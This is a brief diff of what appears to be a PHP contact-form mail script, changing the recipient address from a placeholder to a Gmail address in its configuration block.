@@ -7,7 +7,7 @@ error_reporting(0);
  * ------------------------------------
  */
  
-$to    = "name@example.com"; // <--- Your email ID here
+$to    = "mosejov@gmail.com"; // <--- Your email ID here
 
 $server_email = 'webmaster@yourdomain.com';  // Your server email to authenticate outgoing emails. eg: name@yourdomain.com
 /*
